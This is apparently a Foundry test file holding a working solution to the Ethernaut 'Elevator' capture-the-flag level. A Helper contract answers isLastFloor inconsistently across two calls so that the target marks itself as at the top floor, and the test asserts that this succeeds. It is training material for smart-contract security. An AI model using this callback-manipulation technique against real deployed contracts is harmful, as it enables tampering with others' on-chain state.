// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../src/EthernautCTF/Elevator.sol';
import '@forge-std/Test.sol';
import '@forge-std/console.sol';

contract Helper is Building {
  Elevator elevator;

  constructor(address _targetAddress) {
    elevator = Elevator(_targetAddress);
  }

  function pwn() public {
    elevator.goTo(10); // top floor
  }

  function isLastFloor(uint256 _level) external returns (bool) {
    // First call: isLastFloor(10) with elevator.floor() = 0, it will return false.
    // Second call: isLastFloor(10) with elevator.floor()= 10, it will return true.
    return _level == elevator.floor();
  }
}

contract ElevatorExploit is Test {
  Elevator target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {
    vm.startPrank(deployer);
    target = new Elevator();
    console.log('Target contract deployed');
    vm.stopPrank();
  }

  function testExploit() public {
    assertFalse(target.top());
    assertEq(target.floor(), 0);

    vm.startPrank(exploiter);
    Helper helper = new Helper(address(target));
    helper.pwn();
    vm.stopPrank();

    assertTrue(target.top());
    assertEq(target.floor(), 10); // top floor
  }
}
